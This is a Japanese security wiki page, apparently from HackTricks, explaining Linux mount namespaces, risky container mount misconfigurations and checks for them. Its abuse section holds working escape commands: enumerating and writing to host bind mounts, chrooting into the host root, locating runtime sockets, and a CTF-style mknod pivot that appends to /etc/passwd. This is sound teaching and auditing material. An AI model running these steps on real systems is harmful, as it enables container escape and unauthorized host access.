# Mount Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## 概要

mount namespace は、プロセスから見える **mount table** を制御します。これは最も重要な container isolation 機能の1つです。root filesystem、bind mounts、tmpfs mounts、procfs view、sysfs exposure、そして多くの runtime-specific helper mounts は、すべてこの mount table を通じて表現されるためです。2つのプロセスがどちらも `/`、`/proc`、`/sys`、または `/tmp` にアクセスできる場合でも、それらのパスが何を指すかは、所属している mount namespace によって異なります。

container-security の観点では、mount namespace は「きちんと準備された application filesystem」である状態と、「このプロセスが host filesystem を直接見たり、影響を与えたりできる」状態の違いになることがよくあります。そのため、bind mounts、`hostPath` volumes、privileged mount operations、そして writable な `/proc` や `/sys` の exposures は、すべてこの namespace を中心に成り立っています。

## Operation

runtime が container を起動するとき、通常は新しい mount namespace を作成し、container 用の root filesystem を準備し、必要に応じて procfs やその他の helper filesystems を mount し、その後、必要に応じて bind mounts、tmpfs mounts、secrets、config maps、または host paths を追加します。その namespace 内でプロセスが実行されると、そのプロセスから見える mount の集合は、host のデフォルト view から大きく切り離されます。host は基盤となる実際の filesystem を引き続き認識できますが、container からは runtime によって組み立てられた filesystem が見えます。

これは、host がすべてを管理し続けているにもかかわらず、container に独自の root filesystem があると思わせられるため強力です。一方で、runtime が誤った mount を公開すると、プロセスは host resources を突然可視化できるようになります。このようなアクセスから保護することを、security model の他の部分が想定していない可能性があります。

## Lab

次のコマンドで private mount namespace を作成できます。
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
その namespace の外側で別の shell を開き、mount table を確認すると、tmpfs mount は隔離された mount namespace 内にのみ存在することが分かります。これは、mount isolation が抽象的な理論ではなく、kernel がプロセスに対して文字どおり異なる mount table を提示していることを示す有用な演習です。

その namespace の外側で別の shell を開き、mount table を確認すると、tmpfs mount は隔離された mount namespace 内にのみ存在します。

コンテナ内で簡単に比較すると、次のようになります：
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
2つ目の例は、runtime configurationによってファイルシステムの境界にいかに大きな穴が簡単に開いてしまうかを示しています。

## Runtime Usage

Docker、Podman、containerd-based stacks、CRI-Oはすべて、通常のコンテナでprivate mount namespaceに依存しています。Kubernetesは、volumes、projected secrets、config maps、`hostPath` mountsに同じ仕組みを基盤として使用します。Incus/LXC environmentsもmount namespacesに大きく依存しています。特にsystem containersは、application containersよりもリッチでマシンに近いファイルシステムを公開することが多いためです。

つまり、コンテナのファイルシステム問題を調査するとき、通常見ているのはisolated Dockerのquirkではありません。ワークロードを起動したプラットフォームを通じて表面化した、mount-namespaceとruntime-configurationの問題です。

## Misconfigurations

最も明白で危険なミスは、bind mountを通じてhost root filesystemやその他の機密性の高いhost pathを公開することです。たとえば `-v /:/host` や、Kubernetesにおける書き込み可能な `hostPath` などです。この時点で問題は、もはや「コンテナから何らかの方法でescapeできるか」ではなく、「有用なhost contentのうち、どれだけがすでに直接見えており、書き込み可能なのか」になります。書き込み可能なhost bind mountがあると、exploitの残りの部分は、単純なfile placement、chroot、config modification、またはruntime socket discoveryで済むことがよくあります。

もう1つの一般的な問題は、より安全なcontainer viewを迂回する形でhost `/proc` や `/sys` を公開することです。これらのfilesystemsは通常のdata mountsではなく、kernelおよびprocess stateへのinterfaceです。ワークロードがhost versionsに直接到達できる場合、container hardeningの前提の多くが、もはやきれいには適用できなくなります。

read-only protectionsも重要です。read-only root filesystemによってコンテナが自動的にsecureになるわけではありませんが、attacker staging spaceを大幅に減らし、persistence、helper-binary placement、config tamperingをより困難にします。逆に、writable rootやwritable host bind mountがあると、攻撃者は次のstepを準備するための余地を得ます。

## Abuse

mount namespaceが誤って使用されている場合、攻撃者は一般的に4つの行動のいずれかを取ります。コンテナ外に残されるべきだった**host dataを読み取る**。writable bind mountsを通じて**host configurationを変更する**。capabilitiesとseccompが許可していれば、**追加のresourcesをmountまたはremountする**。または、コンテナplatform自体にさらなるaccessを要求できる、**強力なsocketsやruntime state directoriesに到達する**ことです。

コンテナがすでにhost filesystemを見られる場合、security modelの残りの部分は直ちに変わります。

host bind mountを疑った場合は、まず何が利用可能で、それが書き込み可能かどうかを確認します:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
ホストの root ファイルシステムが read-write でマウントされている場合、ホストへの直接アクセスは、多くの場合、次のように簡単です:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
直接 chroot するのではなく、privileged runtime access が目的なら、ソケットと runtime state を列挙する：
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
`CAP_SYS_ADMIN` が存在する場合は、コンテナ内部から新しい mount を作成できるかどうかもテストします：
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### 完全な例: Two-Shell `mknod` Pivot

より専門的な abuse path は、container の root user が block device を作成でき、host と container が有用な形で user identity を共有しており、さらに attacker がすでに host 上で low-privilege foothold を得ている場合に現れます。この状況では、container は `/dev/sda` のような device node を作成でき、low-privilege host user は、対応する container process の `/proc/<pid>/root/` を通じて、後からそれを読み取ることができます。<sup>[[1]](#references)</sup>

container 内:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
ホストから、コンテナシェルの PID を特定した後、対応する低権限ユーザーとして:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
重要な教訓は、正確な CTF string search そのものではありません。`/proc/<pid>/root/` を介した mount-namespace exposure により、cgroup device policy がコンテナ内部での直接使用を阻止していた場合でも、host user がコンテナによって作成された device nodes を再利用できる可能性があるという点です。<sup>[[1]](#references)</sup>

## Checks

これらのコマンドは、現在のプロセスが実際に存在している filesystem view を確認するためのものです。目的は、host-derived mounts、書き込み可能な sensitive paths、そして通常の application container root filesystem よりも広範に見えるものを見つけることです。
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
ここで注目すべき点:

- ホストからの Bind mount、特に `/`、`/proc`、`/sys`、runtime state ディレクトリ、または socket の場所は、すぐに目立つはずです。
- 予期しない read-write mount は、通常、多数の read-only helper mount よりも重要です。
- `mountinfo` は、パスが実際にホスト由来なのか、overlay-backed なのかを確認するのに適した場所です。

これらのチェックにより、**この namespace からどのリソースが見えるか**、**どのリソースがホスト由来か**、そして **どれが書き込み可能または security-sensitive か**を確認できます。

## 参考文献

- [1] [When Containers Lie: Escaping Root and Breaking Docker Isolation](https://www.kayssel.com/post/docker-security-2/)

{{#include ../../../../../banners/hacktricks-training.md}}
